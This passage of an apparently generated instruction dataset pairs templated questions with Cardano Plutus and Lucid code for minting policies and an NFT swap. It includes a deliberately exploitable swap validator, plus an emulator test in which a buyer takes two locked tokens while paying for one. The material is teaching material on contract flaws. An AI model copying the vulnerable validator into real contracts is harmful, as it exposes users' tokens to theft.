"5909065909030100003233223322323232323232323232323232323232323232323232222223232533532323232325335533533355300d12001323212330012233350052200200200100235001220011233001225335002102610010232325335333573466e3cd400488008d401c880080940904ccd5cd19b87350012200135007220010250241024350012200235500122222222222200c10231335738921115554784f206e6f7420636f6e73756d65640002215335533532330215026001355001222222222222008102222135002222533500415335333573466e3c0080240a009c4ccd5cd19b87001480080a009c409c8840a4408c4cd5ce24811377726f6e6720616d6f756e74206d696e746564000221022135001220023333573466e1cd55cea802a4000466442466002006004646464646464646464646464646666ae68cdc39aab9d500c480008cccccccccccc88888888888848cccccccccccc00403403002c02802402001c01801401000c008cd406c070d5d0a80619a80d80e1aba1500b33501b01d35742a014666aa03eeb94078d5d0a804999aa80fbae501e35742a01066a03604a6ae85401cccd5407c099d69aba150063232323333573466e1cd55cea801240004664424660020060046464646666ae68cdc39aab9d5002480008cc8848cc00400c008cd40c1d69aba150023031357426ae8940088c98c80cccd5ce01a01981889aab9e5001137540026ae854008c8c8c8cccd5cd19b8735573aa004900011991091980080180119a8183ad35742a00460626ae84d5d1280111931901999ab9c034033031135573ca00226ea8004d5d09aba2500223263202f33573806005e05a26aae7940044dd50009aba1500533501b75c6ae854010ccd5407c0848004d5d0a801999aa80fbae200135742a00460486ae84d5d1280111931901599ab9c02c02b029135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d55cf280089baa00135742a00a60266ae84d5d1280291931900e99ab9c01e01d01b3333573466e1cd55ce9baa0064800080708c98c8070cd5ce00e80e00d1bae00633011375c00e6eb401840644c98c8064cd5ce2490350543500019135573ca00226ea8004c8004d5406488448894cd40044d400c88004884ccd401488008c010008ccd54c01c4800401401000448c88c008dd6000990009aa80c911999aab9f0012501b233501a30043574200460066ae8800804c8c8c8cccd5cd19b8735573aa004900011991091980080180118051aba150023005357426ae8940088c98c804ccd5ce00a00980889aab9e5001137540024646464646666ae68cdc39aab9d5004480008cccc888848cccc00401401000c008c8c8c8cccd5cd19b8735573aa0049000119910919800801801180a1aba1500233500d013357426ae8940088c98c8060cd5ce00c80c00b09aab9e5001137540026ae854010ccd54021d728039aba150033232323333573466e1d4005200423212223002004357426aae79400c8cccd5cd19b875002480088c84888c004010dd71aba135573ca00846666ae68cdc3a801a400042444006464c6403466ae7006c06806005c0584d55cea80089baa00135742a00466a012eb8d5d09aba2500223263201433573802a02802426ae8940044d5d1280089aab9e500113754002266aa002eb9d6889119118011bab00132001355016223233335573e0044a032466a03066442466002006004600c6aae754008c014d55cf280118021aba200301113574200224464646666ae68cdc3a800a40004642446004006600a6ae84d55cf280191999ab9a3370ea0049001109100091931900899ab9c01201100f00e135573aa00226ea80048c8c8cccd5cd19b875001480188c848888c010014c020d5d09aab9e500323333573466e1d40092004232122223002005300a357426aae7940108cccd5cd19b875003480088c848888c004014c01cd5d09aab9e500523333573466e1d40112000232122223003005375c6ae84d55cf280311931900899ab9c01201100f00e00d00c135573aa00226ea80048c8c8cccd5cd19b8735573aa004900011980298031aba15002375a6ae84d5d1280111931900699ab9c00e00d00b135573ca00226ea80048848cc00400c0088c8cccd5cd19b8735573aa002900011bae357426aae7940088c98c8028cd5ce00580500409baa001232323232323333573466e1d4005200c21222222200323333573466e1d4009200a21222222200423333573466e1d400d2008233221222222233001009008375c6ae854014dd69aba135744a00a46666ae68cdc3a8022400c4664424444444660040120106eb8d5d0a8039bae357426ae89401c8cccd5cd19b875005480108cc8848888888cc018024020c030d5d0a8049bae357426ae8940248cccd5cd19b875006480088c848888888c01c020c034d5d09aab9e500b23333573466e1d401d2000232122222223005008300e357426aae7940308c98c804ccd5ce00a00980880800780700680600589aab9d5004135573ca00626aae7940084d55cf280089baa0012323232323333573466e1d400520022333222122333001005004003375a6ae854010dd69aba15003375a6ae84d5d1280191999ab9a3370ea0049000119091180100198041aba135573ca00c464c6401866ae700340300280244d55cea80189aba25001135573ca00226ea80048c8c8cccd5cd19b875001480088c8488c00400cdd71aba135573ca00646666ae68cdc3a8012400046424460040066eb8d5d09aab9e500423263200933573801401200e00c26aae7540044dd500089119191999ab9a3370ea00290021091100091999ab9a3370ea00490011190911180180218031aba135573ca00846666ae68cdc3a801a400042444004464c6401466ae7002c02802001c0184d55cea80089baa0012323333573466e1d40052002200a23333573466e1d40092000200a23263200633573800e00c00800626aae74dd5000a4c24002921035054310032001355006222533500110022213500222330073330080020060010033200135500522225335001100222135002225335333573466e1c005200000a0091333008007006003133300800733500b12333001008003002006003122002122001112200212212233001004003112323001001223300330020020011", [utxo.txHash, BigInt(utxo.outputIndex), tn], Params) }; const policyId: PolicyId = lucid.utils.mintingPolicyToId(nftPolicy); console.log(\"minting policy: \" + policyId); const unit: Unit = policyId + tn; const tx = await lucid .newTx() .mintAssets({[unit]: 1n}, Data.void()) .attachMintingPolicy(nftPolicy) .collectFrom([utxo]) .complete(); const signedTx = await tx.sign().complete(); const txHash = await signedTx.submit(); console.log(\"tid: \" + txHash); </s>"}
{"text": "<s>[inst] How does the Cardano NFT minting code snippet use a parameterized PlutusV2 policy script to guarantee the security of signed non-fungible tokens (NFTs)? By requiring the user's public key hash (pkh) as an input to the policy script, does this approach ensure that only the rightful wallet holder can mint and sign the NFTs, ensuring their integrity and authenticity on the Cardano blockchain? [/inst] import { Lucid, Blockfrost, Address, MintingPolicy, PolicyId, Unit, fromText, Data, getAddressDetails, applyParamsToScript } from \"https://deno.land/x/lucid@0.9.1/mod.ts\" import { blockfrostKey, secretSeed } from \"./secret.ts\" function readAmount(): bigint { const input = prompt(\"amount: \"); return input ? BigInt(Number.parseInt(input)) : 1000000n; } // set blockfrost endpoint const lucid = await Lucid.new( new Blockfrost( \"https://cardano-preprod.blockfrost.io/api/v0\", blockfrostKey ), \"Preprod\" ); // load local stored seed as a wallet into lucid lucid.selectWalletFromSeed(secretSeed); const addr: Address = await lucid.wallet.address(); console.log(\"own address: \" + addr); const pkh: string = getAddressDetails(addr).paymentCredential?.hash || \"\"; console.log(\"own pubkey hash: \" + pkh); const Params = Data.Tuple([Data.String]); type Params = Data.Static<typeof Params>; const signedPolicy: MintingPolicy = { type: \"PlutusV2\", script: applyParamsToScript<Params>( "59081a590817010000323232332232323232323232323233223233223232323232322223232533532323253353235001222222222222533533355301612001321233001225335002210031001002501f25335333573466e3c0440040b00ac4d408400454080010840b040a8d40048800840784cd5ce249116d697373696e67207369676e61747572650001d3333573466e1cd55cea80224000466442466002006004646464646464646464646464646666ae68cdc39aab9d500c480008cccccccccccc88888888888848cccccccccccc00403403002c02802402001c01801401000c008cd4060064d5d0a80619a80c00c9aba1500b33501801a35742a014666aa038eb9406cd5d0a804999aa80e3ae501b35742a01066a03004a6ae85401cccd54070099d69aba150063232323333573466e1cd55cea801240004664424660020060046464646666ae68cdc39aab9d5002480008cc8848cc00400c008cd40c1d69aba150023031357426ae8940088c98c80cccd5ce01b01a81889aab9e5001137540026ae854008c8c8c8cccd5cd19b8735573aa004900011991091980080180119a8183ad35742a00460626ae84d5d1280111931901999ab9c036035031135573ca00226ea8004d5d09aba2500223263202f33573806406205a26aae7940044dd50009aba1500533501875c6ae854010ccd540700888004d5d0a801999aa80e3ae200135742a00460486ae84d5d1280111931901599ab9c02e02d029135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d55cf280089baa00135742a00860286ae84d5d1280211931900e99ab9c02001f01b3333573466e1cd55ce9baa0054800080788c98c8070cd5ce00f80f00d1bae005101c13263201a3357389201035054350001c135573ca00226ea8004c8004d5406088448894cd40044d400c88004884ccd401488008c010008ccd54c01c4800401401000448c88c008dd6000990009aa80c111999aab9f0012500a233500930043574200460066ae880080608c8c8cccd5cd19b8735573aa004900011991091980080180118071aba150023005357426ae8940088c98c8058cd5ce00c80c00a09aab9e5001137540024646464646666ae68cdc39aab9d5004480008cccc888848cccc00401401000c008c8c8c8cccd5cd19b8735573aa0049000119910919800801801180b9aba1500233500f016357426ae8940088c98c806ccd5ce00f00e80c89aab9e5001137540026ae854010ccd54021d728039aba150033232323333573466e1d4005200423212223002004357426aae79400c8cccd5cd19b875002480088c84888c004010dd71aba135573ca00846666ae68cdc3a801a400042444006464c6403a66ae7008007c06c0680644d55cea80089baa00135742a00466a016eb8d5d09aba2500223263201733573803403202a26ae8940044d5d1280089aab9e500113754002266aa002eb9d6889119118011bab00132001355015223233335573e0044a010466a00e66442466002006004600c6aae754008c014d55cf280118021aba200301613574200222440042442446600200800624464646666ae68cdc3a800a400046a00e600a6ae84d55cf280191999ab9a3370ea00490011280391931900919ab9c01501401000f135573aa00226ea800448488c00800c44880048c8c8cccd5cd19b875001480188c848888c010014c01cd5d09aab9e500323333573466e1d400920042321222230020053009357426aae7940108cccd5cd19b875003480088c848888c004014c01cd5d09aab9e500523333573466e1d40112000232122223003005375c6ae84d55cf280311931900819ab9c01301200e00d00c00b135573aa00226ea80048c8c8cccd5cd19b8735573aa004900011991091980080180118029aba15002375a6ae84d5d1280111931900619ab9c00f00e00a135573ca00226ea80048c8cccd5cd19b8735573aa002900011bae357426aae7940088c98c8028cd5ce00680600409baa001232323232323333573466e1d4005200c21222222200323333573466e1d4009200a21222222200423333573466e1d400d2008233221222222233001009008375c6ae854014dd69aba135744a00a46666ae68cdc3a8022400c4664424444444660040120106eb8d5d0a8039bae357426ae89401c8cccd5cd19b875005480108cc8848888888cc018024020c030d5d0a8049bae357426ae8940248cccd5cd19b875006480088c848888888c01c020c034d5d09aab9e500b23333573466e1d401d2000232122222223005008300e357426aae7940308c98c804ccd5ce00b00a80880800780700680600589aab9d5004135573ca00626aae7940084d55cf280089baa0012323232323333573466e1d400520022333222122333001005004003375a6ae854010dd69aba15003375a6ae84d5d1280191999ab9a3370ea0049000119091180100198041aba135573ca00c464c6401866ae7003c0380280244d55cea80189aba25001135573ca00226ea80048c8c8cccd5cd19b875001480088c8488c00400cdd71aba135573ca00646666ae68cdc3a8012400046424460040066eb8d5d09aab9e500423263200933573801801600e00c26aae7540044dd500089119191999ab9a3370ea00290021091100091999ab9a3370ea00490011190911180180218031aba135573ca00846666ae68cdc3a801a400042444004464c6401466ae7003403002001c0184d55cea80089baa0012323333573466e1d40052002200623333573466e1d40092000200623263200633573801201000800626aae74dd5000a4c2440042440022400292010350543100112323001001223300330020020011", [pkh], Params) }; const policyId: PolicyId = lucid.utils.mintingPolicyToId(signedPolicy); console.log(\"minting policy: \" + policyId); const unit: Unit = policyId + fromText(\"PPP Signed\"); const amount: bigint = readAmount(); const tx = await lucid .newTx() .mintAssets({[unit]: amount}, Data.void()) .attachMintingPolicy(signedPolicy) .addSignerKey(pkh) .complete(); const signedTx = await tx.sign().complete(); const txHash = await signedTx.submit(); console.log(\"tid: \" + txHash); </s>"}
{"text": "<s>[inst] How does the patched swap script in the Cardano NFT swap contract code prevent a double-spending attack? By addressing the vulnerabilities in the original swap script, does the patched version ensure that only legitimate transactions are accepted and the NFTs are not exploited or duplicated? [/inst] {-# LANGUAGE DataKinds          #-} {-# LANGUAGE FlexibleInstances  #-} {-# LANGUAGE NoImplicitPrelude  #-} {-# LANGUAGE NumericUnderscores #-} {-# LANGUAGE OverloadedStrings  #-} module Main where import           Plutus.Model         (Run, TypedValidator (TypedValidator), adaValue, defaultBabbage, mustFail, testNoErrors, toV2, FakeCoin (FakeCoin), fakeValue, UserSpend, Tx, DatumMode (HashDatum), userSpend, payToScript, spendScript, payToKey, newUser, spend, submitTx, utxoAt, valueAt, logError) import           PlutusTx.Prelude     (($), Integer, Eq ((==)), (&&)) import           Prelude              (IO, (.), (<>), Monoid (mconcat), Traversable (mapM), Num ((-))) import qualified ExploitableSwap      as OnChain import qualified PatchedSwap          as PatchedOnChain (validator) import           Test.Tasty           (defaultMain, testGroup) import           Plutus.V2.Ledger.Api (PubKeyHash, Value, TxOutRef, TxOut (txOutValue)) import           Control.Monad (unless) --------------------------------------------------------------------------------------------------- ------------------------------------------ TESTING ------------------------------------------------ main :: IO () main = do defaultMain $ do testGroup \"Catch double spend with testing\" [ good \"Normal spending using vulnerable script succeeds\" $ normalSpending swapScript , good \"Double spending using vulnerable script succeeds\" $ doubleSpending swapScript , good \"Normal spending using patched script succeeds   \" $ normalSpending patchedSwapScript , bad  \"Double spending using patched script fails      \" $ doubleSpending patchedSwapScript ]  where bad msg = good msg . mustFail good = testNoErrors (adaValue 10_000_000 <> fakeValue scToken 100) defaultBabbage --------------------------------------------------------------------------------------------------- ----------------------------- HELPER FUNCTIONS/INSTANCES/TYPES ------------------------------------ scToken :: FakeCoin scToken = FakeCoin \"Super-Cool-Token\"  type HomeworkScript = TypedValidator OnChain.DatumSwap () swapScript :: HomeworkScript swapScript = TypedValidator $ toV2 OnChain.validator patchedSwapScript :: HomeworkScript patchedSwapScript = TypedValidator $ toV2 PatchedOnChain.validator lockingTx :: HomeworkScript -> PubKeyHash -> Integer -> UserSpend -> Value -> Tx lockingTx script benef price usp val = mconcat [ userSpend usp , payToScript script (HashDatum (OnChain.DatumSwap benef price)) val ] consumingTx :: HomeworkScript -> PubKeyHash -> Integer -> PubKeyHash -> UserSpend -> TxOutRef -> Value -> Tx consumingTx script benef price buyer sp2 ref token = mconcat [ spendScript script ref () (OnChain.DatumSwap benef price) , payToKey buyer token , payToKey benef $ adaValue price , userSpend sp2 ] doubleConsumingTx :: HomeworkScript -> PubKeyHash -> Integer -> PubKeyHash -> UserSpend -> TxOutRef -> TxOutRef -> Value -> Tx doubleConsumingTx script benef price buyer sp2 ref1 ref2 token = mconcat [ spendScript script ref1 () (OnChain.DatumSwap benef price) , spendScript script ref2 () (OnChain.DatumSwap benef price) , payToKey buyer $ token <> token -- Two tokens to buyer , payToKey benef $ adaValue price -- Payment for only one token to beneficiary , userSpend sp2 ] --------------------------------------------------------------------------------------------------- -------------------------------------- TESTING SPENDING ------------------------------------------- normalSpending :: HomeworkScript -> Run () normalSpending script = do  -- SETUP USERS (one with a super cool token) u1 <- newUser (adaValue 1000 <> fakeValue scToken 1) u2 <- newUser (adaValue 1000) -- USER 1 LOCKS TOKEN IN VALIDATOR let token = adaValue 1 <> fakeValue scToken 1 price = 350 sp1 <- spend u1 token                        submitTx u1 $ lockingTx script u1 price sp1 token -- USER 2 BUYS TOKEN utxos <- utxoAt script -- logError $ show utxos let [(ref, out)] = utxos                  sp2 <- spend u2 (adaValue price)                        submitTx u2 $ consumingTx script u1 price u2 sp2 ref (txOutValue out)  -- -- CHECK THAT FINAL BALANCES MATCH EXPECTED BALANCES [v1, v2] <- mapM valueAt [u1, u2]          let expectedV1 = adaValue 999 <> adaValue price let expectedV2 = adaValue (1000 - price) <> token unless (v1 == expectedV1 && v2 == expectedV2) $  logError \"Final balances are incorrect\" doubleSpending :: HomeworkScript -> Run () doubleSpending script = do -- SETUP USERS (one with a super cool token) u1 <- newUser (adaValue 1000 <> fakeValue scToken 2) u2 <- newUser (adaValue 1000) -- USER 1 LOCKS TOKEN IN VALIDATOR TWICE let token = adaValue 1 <> fakeValue scToken 1 price = 350 sp1 <- spend u1 token                        submitTx u1 $ lockingTx script u1 price sp1 token sp1' <- spend u1 token                        submitTx u1 $ lockingTx script u1 price sp1' token -- USER 2 BUYS ONE TOKEN AND STEALS THE OTHER utxos <- utxoAt script let [(ref1, out),(ref2, _)] = utxos                  sp2 <- spend u2 (adaValue price)                        submitTx u2 $ doubleConsumingTx script u1 price u2 sp2 ref1 ref2 (txOutValue out)  -- CHECK THAT FINAL BALANCES MATCH EXPECTED BALANCES [v1, v2] <- mapM valueAt [u1, u2]          let expectedV1 = adaValue 998 <> adaValue price let expectedV2 = adaValue (1000 - price) <> token <> token unless (v1 == expectedV1 && v2 == expectedV2) $  logError \"Final balances are incorrect\" </s>"}
{"text": "<s>[inst] How does the traceIfFalse function in the Cardano NFT swap contract code contribute to the overall security and reliability of the non-fungible token (NFT) swap contract? By enabling logging and error handling, does the traceIfFalse function provide visibility into potential problems and ensure that only valid transactions are processed, helping to protect the contract from errors and exploits? [/inst] {-# LANGUAGE DataKinds           #-}{-# LANGUAGE ImportQualifiedPost #-}{-# LANGUAGE NoImplicitPrelude   #-}{-# LANGUAGE OverloadedStrings   #-}{-# LANGUAGE TemplateHaskell     #-}module ExploitableSwap whereimport           Plutus.V2.Ledger.Api      (ScriptContext (scriptContextTxInfo), PubKeyHash, Validator, mkValidatorScript, adaToken, adaSymbol, singleton)import           Plutus.V2.Ledger.Contexts (valuePaidTo, TxInfo)import           PlutusTx                  (compile, unstableMakeIsData)import           PlutusTx.Builtins         (BuiltinData, Integer)import           PlutusTx.Prelude          (Bool (..), (==), traceIfFalse)import           Utilities                 (wrapValidator)data DatumSwap = DatumSwap { beneficiary :: PubKeyHash , price       :: Integer }PlutusTx.unstableMakeIsData ''DatumSwap{-# INLINABLE mkValidator #-}mkValidator :: DatumSwap -> () -> ScriptContext -> BoolmkValidator ds _ ctx = traceIfFalse \"Hey! You have to pay the owner!\" outputToBeneficiary where txInfo :: TxInfo txInfo = scriptContextTxInfo ctx outputToBeneficiary :: Bool outputToBeneficiary = valuePaidTo txInfo (beneficiary ds) == singleton adaSymbol adaToken (price ds){-# INLINABLE  mkWrappedValidator #-}mkWrappedValidator :: BuiltinData -> BuiltinData -> BuiltinData -> ()mkWrappedValidator = wrapValidator mkValidatorvalidator :: Validatorvalidator = mkValidatorScript $$(compile [|| mkWrappedValidator ||])</s>"}
{"text": "<s>[inst] How do I create a Plutus smart contract that allows for minting assets without restrictions? [/inst] {-# LANGUAGE DataKinds #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE TemplateHaskell #-} module Free where import Plutus.V2.Ledger.Api (BuiltinData, CurrencySymbol, MintingPolicy, ScriptContext, mkMintingPolicyScript) import qualified PlutusTx import PlutusTx.Prelude (Bool (True)) import Prelude (IO) import Utilities (currencySymbol, wrapPolicy, writePolicyToFile) {-# INLINABLE mkFreePolicy #-} mkFreePolicy :: () -> ScriptContext -> Bool mkFreePolicy () _ = True {-# INLINABLE mkWrappedFreePolicy #-} mkWrappedFreePolicy :: BuiltinData -> BuiltinData -> () mkWrappedFreePolicy = wrapPolicy mkFreePolicy freePolicy :: MintingPolicy freePolicy = mkMintingPolicyScript $$(PlutusTx.compile [|| mkWrappedFreePolicy ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveFreePolicy :: IO () saveFreePolicy = writePolicyToFile \"assets/free.plutus\" freePolicy freeCurrencySymbol :: CurrencySymbol freeCurrencySymbol = currencySymbol freePolicy <s>"}
{"text": "<s>[inst] How do I mint a non-fungible token (NFT) using the Plutus code snippet for the NFT minting policy? What are the steps and inputs required to mint a unique and verifiable NFT on the Cardano blockchain? [/inst] {-# LANGUAGE DataKinds         #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell   #-} module NFT where import qualified Data.ByteString.Char8      as BS8 import Plutus.V1.Ledger.Value     (flattenValue) import Plutus.V2.Ledger.Api       (BuiltinData, CurrencySymbol, MintingPolicy, ScriptContext (scriptContextTxInfo), TokenName (unTokenName), TxId (TxId, getTxId), TxInInfo (txInInfoOutRef), TxInfo (txInfoInputs, txInfoMint), TxOutRef (TxOutRef, txOutRefId, txOutRefIdx), mkMintingPolicyScript) import qualified PlutusTx import PlutusTx.Builtins.Internal (BuiltinByteString (BuiltinByteString)) import PlutusTx.Prelude           (Bool (False), Eq ((==)), any, traceIfFalse, ($), (&&)) import Prelude                    (IO, Show (show), String) import Text.Printf                (printf) import Utilities                  (bytesToHex, currencySymbol, wrapPolicy, writeCodeToFile, writePolicyToFile) {-# INLINABLE mkNFTPolicy #-} mkNFTPolicy :: TxOutRef -> TokenName -> () -> ScriptContext -> Bool mkNFTPolicy oref tn () ctx = traceIfFalse \"UTxO not consumed\" hasUTxO && traceIfFalse \"wrong amount minted\" checkMintedAmount where info :: TxInfo info = scriptContextTxInfo ctx hasUTxO :: Bool hasUTxO = any (\\i -> txInInfoOutRef i == oref) $ txInfoInputs info checkMintedAmount :: Bool checkMintedAmount = case flattenValue (txInfoMint info) of [(_, tn'', amt)] -> tn'' == tn && amt == 1 _ -> False {-# INLINABLE mkWrappedNFTPolicy #-} mkWrappedNFTPolicy :: BuiltinData -> BuiltinData -> BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedNFTPolicy tid ix tn' = wrapPolicy $ mkNFTPolicy oref tn where oref :: TxOutRef oref = TxOutRef (TxId $ PlutusTx.unsafeFromBuiltinData tid) (PlutusTx.unsafeFromBuiltinData ix) tn :: TokenName tn = PlutusTx.unsafeFromBuiltinData tn' nftCode :: PlutusTx.CompiledCode (BuiltinData -> BuiltinData -> BuiltinData -> BuiltinData -> BuiltinData -> ()) nftCode = $$(PlutusTx.compile [|| mkWrappedNFTPolicy ||]) nftPolicy :: TxOutRef -> TokenName -> MintingPolicy nftPolicy oref tn = mkMintingPolicyScript $ nftCode `PlutusTx.applyCode` PlutusTx.liftCode (PlutusTx.toBuiltinData $ getTxId $ txOutRefId oref) `PlutusTx.applyCode` PlutusTx.liftCode (PlutusTx.toBuiltinData $ txOutRefIdx oref) `PlutusTx.applyCode` PlutusTx.liftCode (PlutusTx.toBuiltinData tn) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveNFTCode :: IO () saveNFTCode = writeCodeToFile \"assets/nft.plutus\" nftCode saveNFTPolicy :: TxOutRef -> TokenName -> IO () saveNFTPolicy oref tn = writePolicyToFile (printf \"assets/nft-%s#%d-%s.plutus\" (show $ txOutRefId oref) (txOutRefIdx oref) $ tn') $ nftPolicy oref tn where tn' :: String tn' = case unTokenName tn of (BuiltinByteString bs) -> BS8.unpack $ bytesToHex bs nftCurrencySymbol :: TxOutRef -> TokenName -> CurrencySymbol nftCurrencySymbol oref tn = currencySymbol $ nftPolicy oref tn <s>"}
{"text": "<s>[inst] How do I create a Plutus smart contract that allows minting of assets only if the transaction is signed by a specific PubKeyHash? What are the steps to set up the smart contract and what will be the behavior when a user attempts to mint an asset without the correct signature? [/inst] {-# LANGUAGE DataKinds         #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell   #-} module Signed where import           Plutus.V2.Ledger.Api      (BuiltinData, CurrencySymbol, MintingPolicy, PubKeyHash, ScriptContext (scriptContextTxInfo), mkMintingPolicyScript) import           Plutus.V2.Ledger.Contexts (txSignedBy) import qualified PlutusTx import           PlutusTx.Prelude          (Bool, traceIfFalse, ($), (.)) import           Prelude                   (IO, Show (show)) import           Text.Printf               (printf) import           Utilities                 (currencySymbol, wrapPolicy, writeCodeToFile, writePolicyToFile) {-# INLINABLE mkSignedPolicy #-} mkSignedPolicy :: PubKeyHash -> () -> ScriptContext -> Bool mkSignedPolicy pkh () ctx = traceIfFalse \"missing signature\" $ txSignedBy (scriptContextTxInfo ctx) pkh {-# INLINABLE mkWrappedSignedPolicy #-} mkWrappedSignedPolicy :: BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedSignedPolicy pkh = wrapPolicy (mkSignedPolicy $ PlutusTx.unsafeFromBuiltinData pkh) signedCode :: PlutusTx.CompiledCode (BuiltinData -> BuiltinData -> BuiltinData -> ()) signedCode = $$(PlutusTx.compile [|| mkWrappedSignedPolicy ||]) signedPolicy :: PubKeyHash -> MintingPolicy signedPolicy pkh = mkMintingPolicyScript $ signedCode `PlutusTx.applyCode` PlutusTx.liftCode (PlutusTx.toBuiltinData pkh) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveSignedCode :: IO () saveSignedCode = writeCodeToFile \"assets/signed.plutus\" signedCode saveSignedPolicy :: PubKeyHash -> IO () saveSignedPolicy pkh = writePolicyToFile (printf \"assets/signed-%s.plutus\" $ show pkh) $ signedPolicy pkh signedCurrencySymbol :: PubKeyHash -> CurrencySymbol signedCurrencySymbol = currencySymbol . signedPolicy <s>"}
{"text": "<s>[inst] How do I use Lucid and Blockfrost to mint assets on the Cardano blockchain using a free minting policy? What is the process to connect to the Cardano preprod network, select a local wallet, generate the minting policy ID, and mint the desired amount of assets using the mintAssets and submit functions? [/inst] import { Lucid, Blockfrost, Address, MintingPolicy, PolicyId, Unit, fromText, Data } from \"https://deno.land/x/lucid@0.9.1/mod.ts\" import { blockfrostKey, secretSeed } from \"./secret.ts\" function readAmount(): bigint { const input = prompt(\"amount: \"); return input ? BigInt(Number.parseInt(input)) : 1000000n; } const freePolicy: MintingPolicy = { type: \"PlutusV2\", script: \"5830582e010000323222320053333573466e1cd55ce9baa0024800080148c98c8014cd5ce249035054310000500349848005\" }; // set blockfrost endpoint const lucid = await Lucid.new( new Blockfrost( \"https://cardano-preprod.blockfrost.io/api/v0\", blockfrostKey ), \"Preprod\" ); // load local stored seed as a wallet into lucid lucid.selectWalletFromSeed(secretSeed); const addr: Address = await lucid.wallet.address(); console.log(\"own address: \" + addr); const policyId: PolicyId = lucid.utils.mintingPolicyToId(freePolicy); console.log(\"minting policy: \" + policyId); const unit: Unit = policyId + fromText(\"PPP Free\"); const amount: bigint = readAmount(); const tx = await lucid .newTx() .mintAssets({[unit]: amount}, Data.void()) .attachMintingPolicy(freePolicy) .complete(); const signedTx = await tx.sign().complete(); const txHash = await signedTx.submit(); console.log(\"tid: \" + txHash); <s>"}
{"text": "<s>[inst] How do I use Lucid, Blockfrost, and a collected UTXO to mint a non-fungible token (NFT) on the Cardano blockchain? What are the steps to retrieve the user's wallet and address, select a UTXO, and apply the UTXO's transaction hash, output index, and token name to generate the minting policy script and mint the NFT? [/inst] import { Lucid, Blockfrost, Address, MintingPolicy, PolicyId, Unit, fromText, Data, applyParamsToScript } from \"https://deno.land/x/lucid@0.9.1/mod.ts\" import { blockfrostKey, secretSeed } from \"./secret.ts\" // set blockfrost endpoint const lucid = await Lucid.new( new Blockfrost( \"https://cardano-preprod.blockfrost.io/api/v0\", blockfrostKey ), \"Preprod\" ); // load local stored seed as a wallet into lucid lucid.selectWalletFromSeed(secretSeed); const addr: Address = await lucid.wallet.address(); console.log(\"own address: \" + addr); const utxos = await lucid.utxosAt(addr); const utxo = utxos[0]; console.log(\"utxo: \" + utxo.txHash + \"#\" + utxo.outputIndex); const tn = fromText(\"PPP NFT\"); const Params = Data.Tuple([Data.String, Data.BigInt, Data.String]); type Params = Data.Static<typeof Params>; const nftPolicy: MintingPolicy = { type: \"PlutusV2\", script: applyParamsToScript<Params>( \        "5909065909030100003233223322323232323232323232323232323232323232323232222223232533532323232325335533533355300d12001323212330012233350052200200200100235001220011233001225335002102610010232325335333573466e3cd400488008d401c880080940904ccd5cd19b87350012200135007220010250241024350012200235500122222222222200c10231335738921115554784f206e6f7420636f6e73756d65640002215335533532330215026001355001222222222222008102222135002222533500415335333573466e3c0080240a009c4ccd5cd19b87001480080a009c409c8840a4408c4cd5ce24811377726f6e6720616d6f756e74206d696e746564000221022135001220023333573466e1cd55cea802a4000466442466002006004646464646464646464646464646666ae68cdc39aab9d500c480008cccccccccccc88888888888848cccccccccccc00403403002c02802402001c01801401000c008cd406c070d5d0a80619a80d80e1aba1500b33501b01d35742a014666aa03eeb94078d5d0a804999aa80fbae501e35742a01066a03604a6ae85401cccd5407c099d69aba150063232323333573466e1cd55cea801240004664424660020060046464646666ae68cdc39aab9d5002480008cc8848cc00400c008cd40c1d69aba150023031357426ae8940088c98c80cccd5ce01a01981889aab9e5001137540026ae854008c8c8c8cccd5cd19b8735573aa004900011991091980080180119a8183ad35742a00460626ae84d5d1280111931901999ab9c034033031135573ca00226ea8004d5d09aba2500223263202f33573806005e05a26aae7940044dd50009aba1500533501b75c6ae854010ccd5407c0848004d5d0a801999aa80fbae200135742a00460486ae84d5d1280111931901599ab9c02c02b029135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d55cf280089baa00135742a00a60266ae84d5d1280291931900e99ab9c01e01d01b3333573466e1cd55ce9baa0064800080708c98c8070cd5ce00e80e00d1bae00633011375c00e6eb401840644c98c8064cd5ce2490350543500019135573ca00226ea8004c8004d5406488448894cd40044d400c88004884ccd401488008c010008ccd54c01c4800401401000448c88c008dd6000990009aa80c911999aab9f0012501b233501a30043574200460066ae8800804c8c8c8cccd5cd19b8735573aa004900011991091980080180118051aba150023005357426ae8940088c98c804ccd5ce00a00980889aab9e5001137540024646464646666ae68cdc39aab9d5004480008cccc888848cccc00401401000c008c8c8c8cccd5cd19b8735573aa0049000119910919800801801180a1aba1500233500d013357426ae8940088c98c8060cd5ce00c80c00b09aab9e5001137540026ae854010ccd54021d728039aba150033232323333573466e1d4005200423212223002004357426aae79400c8cccd5cd19b875002480088c84888c004010dd71aba135573ca00846666ae68cdc3a801a400042444006464c6403466ae7006c06806005c0584d55cea80089baa00135742a00466a012eb8d5d09aba2500223263201433573802a02802426ae8940044d5d1280089aab9e500113754002266aa002eb9d6889119118011bab00132001355016223233335573e0044a032466a03066442466002006004600c6aae754008c014d55cf280118021aba200301113574200224464646666ae68cdc3a800a40004642446004006600a6ae84d55cf280191999ab9a3370ea0049001109100091931900899ab9c01201100f00e135573aa00226ea80048c8c8cccd5cd19b875001480188c848888c010014c020d5d09aab9e500323333573466e1d40092004232122223002005300a357426aae7940108cccd5cd19b875003480088c848888c004014c01cd5d09aab9e500523333573466e1d40112000232122223003005375c6ae84d55cf280311931900899ab9c01201100f00e00d00c135573aa00226ea80048c8c8cccd5cd19b8735573aa004900011980298031aba15002375a6ae84d5d1280111931900699ab9c00e00d00b135573ca00226ea80048848cc00400c0088c8cccd5cd19b8735573aa002900011bae357426aae7940088c98c8028cd5ce00580500409baa001232323232323333573466e1d4005200c2122222